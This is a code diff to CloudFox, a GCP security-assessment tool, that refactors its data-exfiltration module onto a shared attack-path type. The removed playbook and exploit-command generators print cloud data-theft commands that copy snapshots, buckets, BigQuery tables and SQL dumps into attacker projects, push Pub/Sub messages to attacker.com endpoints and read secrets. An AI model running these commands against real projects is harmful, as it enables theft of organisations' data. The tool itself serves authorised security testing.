@@ -121,17 +121,7 @@ type MissingHardening struct {
 	Recommendation string // How to enable it
 }
 
-// PermissionBasedExfilPath represents an exfiltration capability based on IAM permissions
-type PermissionBasedExfilPath struct {
-	Principal      string   // Who has this capability
-	PrincipalType  string   // user, serviceAccount, group
-	ProjectID      string   // Project where permission exists
-	Permission     string   // The dangerous permission
-	Category       string   // Category of exfiltration
-	RiskLevel      string   // CRITICAL, HIGH, MEDIUM
-	Description    string   // What this enables
-	ExploitCommand string   // Command to exploit
-}
+// PermissionBasedExfilPath is replaced by attackpathservice.AttackPath for centralized handling
 
 // ------------------------------
 // Module Struct
@@ -139,14 +129,14 @@ type PermissionBasedExfilPath struct {
 type DataExfiltrationModule struct {
 	gcpinternal.BaseGCPModule
 
-	ProjectExfiltrationPaths   map[string][]ExfiltrationPath                // projectID -> paths
-	ProjectPotentialVectors    map[string][]PotentialVector                 // projectID -> vectors
-	ProjectPublicExports       map[string][]PublicExport                    // projectID -> exports
-	ProjectPermissionBasedExfil map[string][]PermissionBasedExfilPath       // projectID -> permission-based paths
-	LootMap                    map[string]map[string]*internal.LootFile     // projectID -> loot files
-	mu                         sync.Mutex
-	vpcscProtectedProj         map[string]bool                 // Projects protected by VPC-SC
-	orgPolicyProtection        map[string]*OrgPolicyProtection // Org policy protections per project
+	ProjectExfiltrationPaths map[string][]ExfiltrationPath            // projectID -> paths
+	ProjectPotentialVectors  map[string][]PotentialVector             // projectID -> vectors
+	ProjectPublicExports     map[string][]PublicExport                // projectID -> exports
+	ProjectAttackPaths       map[string][]attackpathservice.AttackPath // projectID -> permission-based attack paths
+	LootMap                  map[string]map[string]*internal.LootFile // projectID -> loot files
+	mu                       sync.Mutex
+	vpcscProtectedProj       map[string]bool                 // Projects protected by VPC-SC
+	orgPolicyProtection      map[string]*OrgPolicyProtection // Org policy protections per project
 }
 
 // ------------------------------
@@ -170,14 +160,14 @@ func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
 	}
 
 	module := &DataExfiltrationModule{
-		BaseGCPModule:              gcpinternal.NewBaseGCPModule(cmdCtx),
-		ProjectExfiltrationPaths:   make(map[string][]ExfiltrationPath),
-		ProjectPotentialVectors:    make(map[string][]PotentialVector),
-		ProjectPublicExports:       make(map[string][]PublicExport),
-		ProjectPermissionBasedExfil: make(map[string][]PermissionBasedExfilPath),
-		LootMap:                    make(map[string]map[string]*internal.LootFile),
-		vpcscProtectedProj:         make(map[string]bool),
-		orgPolicyProtection:        make(map[string]*OrgPolicyProtection),
+		BaseGCPModule:            gcpinternal.NewBaseGCPModule(cmdCtx),
+		ProjectExfiltrationPaths: make(map[string][]ExfiltrationPath),
+		ProjectPotentialVectors:  make(map[string][]PotentialVector),
+		ProjectPublicExports:     make(map[string][]PublicExport),
+		ProjectAttackPaths:       make(map[string][]attackpathservice.AttackPath),
+		LootMap:                  make(map[string]map[string]*internal.LootFile),
+		vpcscProtectedProj:       make(map[string]bool),
+		orgPolicyProtection:      make(map[string]*OrgPolicyProtection),
 	}
 
 	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
@@ -210,9 +200,9 @@ func (m *DataExfiltrationModule) getAllPublicExports() []PublicExport {
 	return all
 }
 
-func (m *DataExfiltrationModule) getAllPermissionBasedExfil() []PermissionBasedExfilPath {
-	var all []PermissionBasedExfilPath
-	for _, paths := range m.ProjectPermissionBasedExfil {
+func (m *DataExfiltrationModule) getAllAttackPaths() []attackpathservice.AttackPath {
+	var all []attackpathservice.AttackPath
+	for _, paths := range m.ProjectAttackPaths {
 		all = append(all, paths...)
 	}
 	return all
@@ -238,7 +228,7 @@ func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Lo
 
 	allPaths := m.getAllExfiltrationPaths()
 	allVectors := m.getAllPotentialVectors()
-	allPermBasedPaths := m.getAllPermissionBasedExfil()
+	allPermBasedPaths := m.getAllAttackPaths()
 
 	// Check results
 	hasResults := len(allPaths) > 0 || len(allVectors) > 0 || len(hardeningRecs) > 0 || len(allPermBasedPaths) > 0
@@ -276,26 +266,20 @@ func (m *DataExfiltrationModule) analyzeOrgFolderExfilPaths(ctx context.Context,
 		}
 	} else if len(orgPaths) > 0 {
 		logger.InfoM(fmt.Sprintf("Found %d organization-level exfil path(s)", len(orgPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
-		for _, path := range orgPaths {
-			orgName := orgNames[path.ScopeID]
+		for i := range orgPaths {
+			orgName := orgNames[orgPaths[i].ScopeID]
 			if orgName == "" {
-				orgName = path.ScopeID
+				orgName = orgPaths[i].ScopeID
 			}
-			exfilPath := PermissionBasedExfilPath{
-				Principal:      path.Principal,
-				PrincipalType:  path.PrincipalType,
-				ProjectID:      "org:" + path.ScopeID,
-				Permission:     path.Method,
-				Category:       path.Category + " (Org: " + orgName + ")",
-				RiskLevel:      "CRITICAL", // Org-level is critical
-				Description:    path.Description,
-				ExploitCommand: path.ExploitCommand,
-			}
-			// Store under a special "organization" key
-			m.mu.Lock()
-			m.ProjectPermissionBasedExfil["organization"] = append(m.ProjectPermissionBasedExfil["organization"], exfilPath)
-			m.mu.Unlock()
+			// Update the path with org context
+			orgPaths[i].ScopeName = orgName
+			orgPaths[i].RiskLevel = "CRITICAL" // Org-level is critical
+			orgPaths[i].PathType = "exfil"
 		}
+		// Store under a special "organization" key
+		m.mu.Lock()
+		m.ProjectAttackPaths["organization"] = append(m.ProjectAttackPaths["organization"], orgPaths...)
+		m.mu.Unlock()
 	}
 
 	// Analyze folder-level IAM
@@ -306,26 +290,20 @@ func (m *DataExfiltrationModule) analyzeOrgFolderExfilPaths(ctx context.Context,
 		}
 	} else if len(folderPaths) > 0 {
 		logger.InfoM(fmt.Sprintf("Found %d folder-level exfil path(s)", len(folderPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
-		for _, path := range folderPaths {
-			folderName := folderNames[path.ScopeID]
+		for i := range folderPaths {
+			folderName := folderNames[folderPaths[i].ScopeID]
 			if folderName == "" {
-				folderName = path.ScopeID
+				folderName = folderPaths[i].ScopeID
 			}
-			exfilPath := PermissionBasedExfilPath{
-				Principal:      path.Principal,
-				PrincipalType:  path.PrincipalType,
-				ProjectID:      "folder:" + path.ScopeID,
-				Permission:     path.Method,
-				Category:       path.Category + " (Folder: " + folderName + ")",
-				RiskLevel:      "CRITICAL", // Folder-level is critical
-				Description:    path.Description,
-				ExploitCommand: path.ExploitCommand,
-			}
-			// Store under a special "folder" key
-			m.mu.Lock()
-			m.ProjectPermissionBasedExfil["folder"] = append(m.ProjectPermissionBasedExfil["folder"], exfilPath)
-			m.mu.Unlock()
+			// Update the path with folder context
+			folderPaths[i].ScopeName = folderName
+			folderPaths[i].RiskLevel = "CRITICAL" // Folder-level is critical
+			folderPaths[i].PathType = "exfil"
 		}
+		// Store under a special "folder" key
+		m.mu.Lock()
+		m.ProjectAttackPaths["folder"] = append(m.ProjectAttackPaths["folder"], folderPaths...)
+		m.mu.Unlock()
 	}
 }
 
@@ -676,268 +654,145 @@ func (m *DataExfiltrationModule) initializeLootForProject(projectID string) {
 }
 
 func (m *DataExfiltrationModule) generatePlaybook() *internal.LootFile {
-	return &internal.LootFile{
-		Name: "data-exfiltration-playbook",
-		Contents: `# GCP Data Exfiltration Playbook
-# Generated by CloudFox
-#
-# This playbook provides exploitation techniques for identified data exfiltration paths.
+	// Convert all findings to AttackPath format for centralized playbook generation
+	allAttackPaths := m.collectAllAttackPaths()
 
-` + m.generatePlaybookSections(),
+	return &internal.LootFile{
+		Name:     "data-exfiltration-playbook",
+		Contents: attackpathservice.GenerateExfilPlaybook(allAttackPaths, ""),
 	}
 }
 
-func (m *DataExfiltrationModule) generatePlaybookSections() string {
-	var sections strings.Builder
+// collectAllAttackPaths converts ExfiltrationPath, PotentialVector, and PublicExport to AttackPath
+func (m *DataExfiltrationModule) collectAllAttackPaths() []attackpathservice.AttackPath {
+	var allPaths []attackpathservice.AttackPath
 
-	allPaths := m.getAllExfiltrationPaths()
-	allVectors := m.getAllPotentialVectors()
-	allExports := m.getAllPublicExports()
-	allPermPaths := m.getAllPermissionBasedExfil()
-
-	// Group by path type
-	publicSnapshots := []ExfiltrationPath{}
-	publicImages := []ExfiltrationPath{}
-	publicBuckets := []ExfiltrationPath{}
-	loggingSinks := []ExfiltrationPath{}
-	pubsubPaths := []ExfiltrationPath{}
-	bqPaths := []ExfiltrationPath{}
-	sqlPaths := []ExfiltrationPath{}
-	transferPaths := []ExfiltrationPath{}
-
-	for _, p := range allPaths {
-		switch {
-		case strings.Contains(p.PathType, "Snapshot"):
-			publicSnapshots = append(publicSnapshots, p)
-		case strings.Contains(p.PathType, "Image"):
-			publicImages = append(publicImages, p)
-		case strings.Contains(p.PathType, "Bucket") || strings.Contains(p.PathType, "Storage"):
-			publicBuckets = append(publicBuckets, p)
-		case strings.Contains(p.PathType, "Logging"):
-			loggingSinks = append(loggingSinks, p)
-		case strings.Contains(p.PathType, "Pub/Sub") || strings.Contains(p.PathType, "PubSub"):
-			pubsubPaths = append(pubsubPaths, p)
-		case strings.Contains(p.PathType, "BigQuery"):
-			bqPaths = append(bqPaths, p)
-		case strings.Contains(p.PathType, "SQL"):
-			sqlPaths = append(sqlPaths, p)
-		case strings.Contains(p.PathType, "Transfer"):
-			transferPaths = append(transferPaths, p)
+	// Convert ExfiltrationPaths (actual misconfigurations)
+	for _, paths := range m.ProjectExfiltrationPaths {
+		for _, p := range paths {
+			allPaths = append(allPaths, m.exfiltrationPathToAttackPath(p))
 		}
 	}
 
-	// Public Snapshots
-	if len(publicSnapshots) > 0 {
-		sections.WriteString("## Public Compute Snapshots\n\n")
-		sections.WriteString("These snapshots are publicly accessible and can be used to create disks in attacker-controlled projects.\n\n")
-		sections.WriteString("### Vulnerable Snapshots:\n")
-		for _, p := range publicSnapshots {
-			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# Create disk from public snapshot in attacker project\n")
-		sections.WriteString("gcloud compute disks create exfil-disk \\\n")
-		sections.WriteString("    --source-snapshot=projects/VICTIM_PROJECT/global/snapshots/SNAPSHOT_NAME \\\n")
-		sections.WriteString("    --zone=us-central1-a \\\n")
-		sections.WriteString("    --project=ATTACKER_PROJECT\n\n")
-		sections.WriteString("# Attach disk to instance\n")
-		sections.WriteString("gcloud compute instances attach-disk INSTANCE \\\n")
-		sections.WriteString("    --disk=exfil-disk --zone=us-central1-a\n\n")
-		sections.WriteString("# Mount and access data\n")
-		sections.WriteString("sudo mkdir /mnt/exfil && sudo mount /dev/sdb1 /mnt/exfil\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// Public Images
-	if len(publicImages) > 0 {
-		sections.WriteString("## Public Compute Images\n\n")
-		sections.WriteString("These images are publicly accessible and may contain sensitive data or credentials.\n\n")
-		sections.WriteString("### Vulnerable Images:\n")
-		for _, p := range publicImages {
-			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# Create instance from public image in attacker project\n")
-		sections.WriteString("gcloud compute instances create exfil-vm \\\n")
-		sections.WriteString("    --image=projects/VICTIM_PROJECT/global/images/IMAGE_NAME \\\n")
-		sections.WriteString("    --zone=us-central1-a \\\n")
-		sections.WriteString("    --project=ATTACKER_PROJECT\n\n")
-		sections.WriteString("# Access the instance and search for credentials\n")
-		sections.WriteString("gcloud compute ssh exfil-vm --zone=us-central1-a\n")
-		sections.WriteString("find / -name '*.pem' -o -name '*.key' -o -name 'credentials*' 2>/dev/null\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// Public Buckets
-	if len(publicBuckets) > 0 || len(allExports) > 0 {
-		sections.WriteString("## Public Storage Buckets\n\n")
-		sections.WriteString("These buckets are publicly accessible.\n\n")
-		sections.WriteString("### Vulnerable Buckets:\n")
-		for _, p := range publicBuckets {
-			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
-		}
-		for _, e := range allExports {
-			if e.ResourceType == "bucket" {
-				sections.WriteString(fmt.Sprintf("- %s in %s (%s)\n", e.ResourceName, e.ProjectID, e.AccessLevel))
-			}
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# List bucket contents\n")
-		sections.WriteString("gsutil ls -r gs://BUCKET_NAME/\n\n")
-		sections.WriteString("# Download all data\n")
-		sections.WriteString("gsutil -m cp -r gs://BUCKET_NAME/ ./exfil/\n\n")
-		sections.WriteString("# Search for sensitive files\n")
-		sections.WriteString("gsutil ls -r gs://BUCKET_NAME/ | grep -E '\\.(pem|key|json|env|config)$'\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// Logging Sinks
-	if len(loggingSinks) > 0 {
-		sections.WriteString("## Cross-Project Logging Sinks\n\n")
-		sections.WriteString("These logging sinks export logs to external destinations.\n\n")
-		sections.WriteString("### Identified Sinks:\n")
-		for _, p := range loggingSinks {
-			sections.WriteString(fmt.Sprintf("- %s -> %s\n", p.ResourceName, p.Destination))
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# Create logging sink to attacker-controlled destination\n")
-		sections.WriteString("gcloud logging sinks create exfil-sink \\\n")
-		sections.WriteString("    pubsub.googleapis.com/projects/ATTACKER_PROJECT/topics/exfil-logs \\\n")
-		sections.WriteString("    --log-filter='resource.type=\"gce_instance\"'\n\n")
-		sections.WriteString("# Export all audit logs\n")
-		sections.WriteString("gcloud logging sinks create audit-exfil \\\n")
-		sections.WriteString("    storage.googleapis.com/ATTACKER_BUCKET \\\n")
-		sections.WriteString("    --log-filter='protoPayload.@type=\"type.googleapis.com/google.cloud.audit.AuditLog\"'\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// Pub/Sub
-	if len(pubsubPaths) > 0 {
-		sections.WriteString("## Pub/Sub Exfiltration Paths\n\n")
-		sections.WriteString("These Pub/Sub configurations enable data exfiltration.\n\n")
-		sections.WriteString("### Identified Paths:\n")
-		for _, p := range pubsubPaths {
-			sections.WriteString(fmt.Sprintf("- %s -> %s\n", p.ResourceName, p.Destination))
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# Create push subscription to attacker endpoint\n")
-		sections.WriteString("gcloud pubsub subscriptions create exfil-sub \\\n")
-		sections.WriteString("    --topic=TOPIC_NAME \\\n")
-		sections.WriteString("    --push-endpoint=https://attacker.com/receive\n\n")
-		sections.WriteString("# Or create pull subscription and export\n")
-		sections.WriteString("gcloud pubsub subscriptions create exfil-pull --topic=TOPIC_NAME\n")
-		sections.WriteString("gcloud pubsub subscriptions pull exfil-pull --limit=1000 --auto-ack\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// BigQuery
-	if len(bqPaths) > 0 {
-		sections.WriteString("## BigQuery Data Exfiltration\n\n")
-		sections.WriteString("These BigQuery configurations enable data exfiltration.\n\n")
-		sections.WriteString("### Identified Paths:\n")
-		for _, p := range bqPaths {
-			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# Export table to GCS bucket (requires storage.objects.create)\n")
-		sections.WriteString("bq extract \\\n")
-		sections.WriteString("    --destination_format=NEWLINE_DELIMITED_JSON \\\n")
-		sections.WriteString("    'PROJECT:DATASET.TABLE' \\\n")
-		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/data-*.json\n\n")
-		sections.WriteString("# Query and save locally\n")
-		sections.WriteString("bq query --format=json 'SELECT * FROM PROJECT.DATASET.TABLE' > exfil.json\n\n")
-		sections.WriteString("# Copy dataset to attacker project\n")
-		sections.WriteString("bq cp PROJECT:DATASET.TABLE ATTACKER_PROJECT:EXFIL_DATASET.TABLE\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// Cloud SQL
-	if len(sqlPaths) > 0 {
-		sections.WriteString("## Cloud SQL Data Exfiltration\n\n")
-		sections.WriteString("These Cloud SQL instances have export capabilities.\n\n")
-		sections.WriteString("### Identified Instances:\n")
-		for _, p := range sqlPaths {
-			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# Export database to GCS\n")
-		sections.WriteString("gcloud sql export sql INSTANCE_NAME \\\n")
-		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/dump.sql \\\n")
-		sections.WriteString("    --database=DATABASE_NAME\n\n")
-		sections.WriteString("# Export as CSV\n")
-		sections.WriteString("gcloud sql export csv INSTANCE_NAME \\\n")
-		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/data.csv \\\n")
-		sections.WriteString("    --database=DATABASE_NAME \\\n")
-		sections.WriteString("    --query='SELECT * FROM sensitive_table'\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// Storage Transfer
-	if len(transferPaths) > 0 {
-		sections.WriteString("## Storage Transfer Service Exfiltration\n\n")
-		sections.WriteString("These storage transfer jobs export data to external destinations.\n\n")
-		sections.WriteString("### Identified Jobs:\n")
-		for _, p := range transferPaths {
-			sections.WriteString(fmt.Sprintf("- %s -> %s\n", p.ResourceName, p.Destination))
-		}
-		sections.WriteString("\n### Exploitation:\n")
-		sections.WriteString("```bash\n")
-		sections.WriteString("# Create transfer job to external AWS S3\n")
-		sections.WriteString("gcloud transfer jobs create \\\n")
-		sections.WriteString("    gs://SOURCE_BUCKET \\\n")
-		sections.WriteString("    s3://attacker-bucket \\\n")
-		sections.WriteString("    --source-creds-file=gcs-creds.json\n")
-		sections.WriteString("```\n\n")
-	}
-
-	// Permission-based exfil
-	if len(allPermPaths) > 0 {
-		sections.WriteString("## Permission-Based Exfiltration Capabilities\n\n")
-		sections.WriteString("These principals have permissions that enable data exfiltration.\n\n")
-
-		// Group by category
-		categoryPaths := make(map[string][]PermissionBasedExfilPath)
-		for _, p := range allPermPaths {
-			categoryPaths[p.Category] = append(categoryPaths[p.Category], p)
-		}
-
-		for category, paths := range categoryPaths {
-			sections.WriteString(fmt.Sprintf("### %s\n", category))
-			for _, p := range paths {
-				sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", p.Principal, p.PrincipalType, p.Permission))
-			}
-			sections.WriteString("\n")
+	// Convert PotentialVectors
+	for _, vectors := range m.ProjectPotentialVectors {
+		for _, v := range vectors {
+			allPaths = append(allPaths, m.potentialVectorToAttackPath(v))
 		}
 	}
 
-	// Potential Vectors
-	if len(allVectors) > 0 {
-		sections.WriteString("## Potential Exfiltration Vectors\n\n")
-		sections.WriteString("These resources could be used for data exfiltration if compromised.\n\n")
-
-		// Group by vector type
-		vectorTypes := make(map[string][]PotentialVector)
-		for _, v := range allVectors {
-			vectorTypes[v.VectorType] = append(vectorTypes[v.VectorType], v)
-		}
-
-		for vType, vectors := range vectorTypes {
-			sections.WriteString(fmt.Sprintf("### %s\n", vType))
-			for _, v := range vectors {
-				sections.WriteString(fmt.Sprintf("- %s in %s\n", v.ResourceName, v.ProjectID))
-			}
-			sections.WriteString("\n")
+	// Convert PublicExports (bucket specific public exports)
+	for _, exports := range m.ProjectPublicExports {
+		for _, e := range exports {
+			allPaths = append(allPaths, m.publicExportToAttackPath(e))
 		}
 	}
 
-	return sections.String()
+	// Include permission-based attack paths (already in AttackPath format)
+	for _, paths := range m.ProjectAttackPaths {
+		allPaths = append(allPaths, paths...)
+	}
+
+	return allPaths
+}
+
+// exfiltrationPathToAttackPath converts ExfiltrationPath to AttackPath with correct category mapping
+func (m *DataExfiltrationModule) exfiltrationPathToAttackPath(p ExfiltrationPath) attackpathservice.AttackPath {
+	// Map PathType to centralized category
+	category := mapExfilPathTypeToCategory(p.PathType)
+
+	return attackpathservice.AttackPath{
+		PathType:       "exfil",
+		Category:       category,
+		Method:         p.PathType,
+		Principal:      "N/A (Misconfiguration)",
+		PrincipalType:  "resource",
+		TargetResource: p.ResourceName,
+		ProjectID:      p.ProjectID,
+		ScopeType:      "project",
+		ScopeID:        p.ProjectID,
+		ScopeName:      p.ProjectID,
+		Description:    p.Destination,
+		Permissions:    []string{},
+		ExploitCommand: p.ExploitCommand,
+	}
+}
+
+// potentialVectorToAttackPath converts PotentialVector to AttackPath
+func (m *DataExfiltrationModule) potentialVectorToAttackPath(v PotentialVector) attackpathservice.AttackPath {
+	return attackpathservice.AttackPath{
+		PathType:       "exfil",
+		Category:       "Potential Vector",
+		Method:         v.VectorType,
+		Principal:      "N/A (Potential)",
+		PrincipalType:  "resource",
+		TargetResource: v.ResourceName,
+		ProjectID:      v.ProjectID,
+		ScopeType:      "project",
+		ScopeID:        v.ProjectID,
+		ScopeName:      v.ProjectID,
+		Description:    v.Destination,
+		Permissions:    []string{},
+		ExploitCommand: v.ExploitCommand,
+	}
+}
+
+// publicExportToAttackPath converts PublicExport to AttackPath
+func (m *DataExfiltrationModule) publicExportToAttackPath(e PublicExport) attackpathservice.AttackPath {
+	category := "Public Bucket"
+	if e.ResourceType == "snapshot" {
+		category = "Public Snapshot"
+	} else if e.ResourceType == "image" {
+		category = "Public Image"
+	} else if e.ResourceType == "dataset" {
+		category = "Public BigQuery"
+	}
+
+	return attackpathservice.AttackPath{
+		PathType:       "exfil",
+		Category:       category,
+		Method:         e.ResourceType + " (" + e.AccessLevel + ")",
+		Principal:      e.AccessLevel,
+		PrincipalType:  "public",
+		TargetResource: e.ResourceName,
+		ProjectID:      e.ProjectID,
+		ScopeType:      "project",
+		ScopeID:        e.ProjectID,
+		ScopeName:      e.ProjectID,
+		Description:    fmt.Sprintf("Public %s with %s access", e.ResourceType, e.AccessLevel),
+		Permissions:    []string{},
+		ExploitCommand: "",
+	}
+}
+
+// mapExfilPathTypeToCategory maps ExfiltrationPath.PathType to centralized categories
+func mapExfilPathTypeToCategory(pathType string) string {
+	switch {
+	case strings.Contains(pathType, "Snapshot"):
+		return "Public Snapshot"
+	case strings.Contains(pathType, "Image"):
+		return "Public Image"
+	case strings.Contains(pathType, "Bucket"), strings.Contains(pathType, "Storage"):
+		return "Public Bucket"
+	case strings.Contains(pathType, "Logging"):
+		return "Logging Sink"
+	case strings.Contains(pathType, "Pub/Sub Push") || strings.Contains(pathType, "PubSub Push"):
+		return "Pub/Sub Push"
+	case strings.Contains(pathType, "Pub/Sub BigQuery") || strings.Contains(pathType, "PubSub BigQuery"):
+		return "Pub/Sub BigQuery Export"
+	case strings.Contains(pathType, "Pub/Sub GCS") || strings.Contains(pathType, "PubSub GCS"):
+		return "Pub/Sub GCS Export"
+	case strings.Contains(pathType, "Pub/Sub") || strings.Contains(pathType, "PubSub"):
+		return "Pub/Sub Push" // Default Pub/Sub category
+	case strings.Contains(pathType, "BigQuery"):
+		return "Public BigQuery"
+	case strings.Contains(pathType, "SQL"):
+		return "Cloud SQL Export"
+	case strings.Contains(pathType, "Transfer"):
+		return "Storage Transfer Job"
+	default:
+		return "Potential Vector"
+	}
 }
 
 func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
@@ -1800,8 +1655,7 @@ gcloud logging sinks update SINK_NAME \
 }
 
 // findPermissionBasedExfilPaths identifies principals with data exfiltration permissions
-// This now uses the centralized attackpathService for project-level analysis only
-// Org/folder/resource level analysis is done separately in findAllLevelExfilPaths
+// This uses the centralized attackpathService for project and resource-level analysis
 func (m *DataExfiltrationModule) findPermissionBasedExfilPaths(ctx context.Context, projectID string, logger internal.Logger) {
 	// Use attackpathService for project-level analysis
 	attackSvc := attackpathservice.New()
@@ -1814,23 +1668,10 @@ func (m *DataExfiltrationModule) findPermissionBasedExfilPaths(ctx context.Conte
 		return
 	}
 
-	// Convert AttackPath to PermissionBasedExfilPath
-	for _, path := range paths {
-		exfilPath := PermissionBasedExfilPath{
-			Principal:      path.Principal,
-			PrincipalType:  path.PrincipalType,
-			ProjectID:      projectID,
-			Permission:     path.Method,
-			Category:       path.Category,
-			RiskLevel:      "HIGH", // Default risk level
-			Description:    path.Description,
-			ExploitCommand: path.ExploitCommand,
-		}
-
-		m.mu.Lock()
-		m.ProjectPermissionBasedExfil[projectID] = append(m.ProjectPermissionBasedExfil[projectID], exfilPath)
-		m.mu.Unlock()
-	}
+	// Store paths directly (they're already AttackPath type)
+	m.mu.Lock()
+	m.ProjectAttackPaths[projectID] = append(m.ProjectAttackPaths[projectID], paths...)
+	m.mu.Unlock()
 
 	// Also analyze resource-level IAM
 	resourcePaths, err := attackSvc.AnalyzeResourceAttackPaths(ctx, projectID, "exfil")
@@ -1840,56 +1681,9 @@ func (m *DataExfiltrationModule) findPermissionBasedExfilPaths(ctx context.Conte
 				fmt.Sprintf("Could not analyze resource-level exfil permissions for project %s", projectID))
 		}
 	} else {
-		for _, path := range resourcePaths {
-			exfilPath := PermissionBasedExfilPath{
-				Principal:      path.Principal,
-				PrincipalType:  path.PrincipalType,
-				ProjectID:      projectID,
-				Permission:     path.Method,
-				Category:       path.Category + " (Resource: " + path.ScopeName + ")",
-				RiskLevel:      "HIGH",
-				Description:    path.Description,
-				ExploitCommand: path.ExploitCommand,
-			}
-
-			m.mu.Lock()
-			m.ProjectPermissionBasedExfil[projectID] = append(m.ProjectPermissionBasedExfil[projectID], exfilPath)
-			m.mu.Unlock()
-		}
-	}
-}
-
-// generateExfilExploitCommand generates an exploit command for a data exfil permission
-func (m *DataExfiltrationModule) generateExfilExploitCommand(permission, projectID string) string {
-	switch permission {
-	case "compute.images.create":
-		return fmt.Sprintf(`# Create image from disk (for export)
-gcloud compute images create exfil-image --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s
-# Export to external bucket
-gcloud compute images export --image=exfil-image --destination-uri=gs://EXTERNAL_BUCKET/image.tar.gz --project=%s`, projectID, projectID)
-	case "compute.snapshots.create":
-		return fmt.Sprintf(`# Create snapshot from disk (for export)
-gcloud compute snapshots create exfil-snapshot --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s`, projectID)
-	case "logging.sinks.create":
-		return fmt.Sprintf(`# Create logging sink to external destination
-gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/EXTERNAL_PROJECT/topics/stolen-logs --project=%s`, projectID)
-	case "cloudsql.instances.export":
-		return fmt.Sprintf(`# Export Cloud SQL database to GCS
-gcloud sql export sql INSTANCE_NAME gs://BUCKET/export.sql --database=DB_NAME --project=%s`, projectID)
-	case "pubsub.subscriptions.create":
-		return fmt.Sprintf(`# Create subscription to intercept messages
-gcloud pubsub subscriptions create exfil-sub --topic=TOPIC_NAME --push-endpoint=https://attacker.com/collect --project=%s`, projectID)
-	case "bigquery.tables.export":
-		return fmt.Sprintf(`# Export BigQuery table to GCS
-bq extract --destination_format=CSV '%s:DATASET.TABLE' gs://BUCKET/export.csv`, projectID)
-	case "storagetransfer.jobs.create":
-		return fmt.Sprintf(`# Create transfer job to external cloud (requires API)
-gcloud transfer jobs create gs://SOURCE_BUCKET s3://DEST_BUCKET --project=%s`, projectID)
-	case "secretmanager.versions.access":
-		return fmt.Sprintf(`# Access secret values
-gcloud secrets versions access latest --secret=SECRET_NAME --project=%s`, projectID)
-	default:
-		return fmt.Sprintf("# Permission: %s\n# Refer to GCP documentation for exploitation", permission)
+		m.mu.Lock()
+		m.ProjectAttackPaths[projectID] = append(m.ProjectAttackPaths[projectID], resourcePaths...)
+		m.mu.Unlock()
 	}
 }
 
